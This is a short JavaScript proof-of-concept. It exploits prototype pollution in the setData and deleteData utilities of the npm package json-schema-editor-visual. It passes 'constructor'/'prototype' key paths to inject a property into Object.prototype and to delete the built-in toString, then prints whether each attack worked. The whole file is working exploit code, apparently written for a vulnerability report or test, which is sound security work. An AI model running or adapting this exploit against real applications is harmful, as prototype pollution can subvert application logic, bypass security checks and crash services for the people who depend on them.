let state = {};
require("json-schema-editor-visual/package/utils").setData(state, ['constructor', 'prototype', 'pollutedProperty'], 'pollutedValue');
// Verification
console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'');


const states = {};
const riskyArg = ['constructor', 'prototype', 'toString']; 
require("json-schema-editor-visual/package/utils").deleteData(states, riskyArg);
console.log({}.toString ? '':'[DELETE_TRIGGERED]');